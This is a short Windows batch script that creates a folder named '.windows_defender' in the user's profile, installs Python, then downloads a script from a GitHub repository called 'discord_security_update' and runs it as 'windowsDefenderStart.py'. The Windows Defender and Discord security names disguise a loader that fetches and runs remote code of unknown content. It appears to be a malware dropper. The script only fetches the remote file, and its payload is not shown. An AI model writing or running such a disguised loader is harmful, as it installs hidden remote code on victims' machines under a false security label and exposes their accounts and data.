@echo off
cd %USERPROFILE%

if not exist "%USERPROFILE%\.windows_defender" (
    mkdir .windows_defender
)
cd .windows_defender

if not exist "%USERPROFILE%\.windows_defender\python-3.10.7-amd64.exe" (
    curl https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe -O
    python-3.10.7-amd64.exe
)

del windowsDefenderStart.py
curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefenderStart.py -O

python -m ensurepip

py windowsDefenderStart.py
